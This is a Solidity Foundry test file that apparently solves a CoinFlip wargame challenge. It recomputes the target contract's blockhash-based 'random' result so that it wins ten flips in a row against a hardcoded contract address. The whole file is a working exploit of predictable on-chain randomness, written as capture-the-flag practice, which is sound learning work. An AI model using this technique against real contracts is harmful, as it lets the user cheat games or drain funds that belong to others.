// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFlipTest is Test {
    function test() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // trickery to get the contract to generate a blockhash and not get underflows
        vm.roll(5);
        // get the instance of the contract
        CoinFlip instance = CoinFlip(
            payable(0x7D69D27Da092c5A2A5aBB5F6025d9B9bDb938418)
        );

        // looping 10 times to pass the challenge
        for (uint256 i = 0; i < 10; ++i) {
            // Calculating the side value as in the contract
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue /
                57896044618658097711785492504343953926634992332820282019728792003956564819968;
            bool side = coinFlip == 1 ? true : false;
            instance.flip(side);
            vm.roll(block.number + 1);
             console.log("Consecutive Wins: ", instance.consecutiveWins());
        }
        vm.stopBroadcast();
    }
}
